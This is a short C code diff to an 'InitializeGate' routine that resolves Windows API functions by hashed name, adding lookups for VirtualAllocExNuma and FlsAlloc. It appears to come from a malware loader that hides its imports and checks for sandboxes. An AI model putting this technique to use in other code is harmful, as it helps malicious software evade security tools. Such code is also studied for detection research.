@@ -41,6 +41,8 @@ VOID InitializeGate() {
     if ( ! ( Gate.Win32.ResumeThread                = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "ResumeThread" ) ) ) ) return;
     if ( ! ( Gate.Win32.VirtualAlloc                = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "VirtualAlloc" ) ) ) ) return;
     if ( ! ( Gate.Win32.EnumChildWindows            = LdrFunction(Gate.Modules.User32.BaseAddress,   HASH_STR( "EnumChildWindows" ) ) ) ) return;
+    if ( ! ( Gate.Win32.VirtualAllocExNuma          = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "VirtualAllocExNuma" ) ) ) ) return;
+    if ( ! ( Gate.Win32.FlsAlloc                    = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "FlsAlloc" ) ) ) ) return;
 
     DEBUG_PRINT("[!] Block 4 loaded.");
 
